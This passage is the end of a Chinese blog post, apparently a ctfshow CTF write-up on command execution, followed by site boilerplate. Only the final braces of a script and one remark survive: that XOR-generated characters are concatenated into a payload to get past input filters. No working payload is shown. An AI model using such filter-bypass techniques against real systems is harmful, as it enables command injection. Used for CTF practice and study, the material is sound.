/&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这个脚本通过异或可以生成很多的字符，拼接最后就可以得到payload涨知识了</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" class="category-chain-item">每日一题</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ctfshow命令执行</div>
      <div>https://0ran9ewww.github.io/2024/09/11/每日一题/ctfshow命令执行/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月11日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年9月11日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow文件包含">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ctfshow文件包含</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/" title="ctfshow-jwt">
                        <span class="hidden-mobile">ctfshow-jwt</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>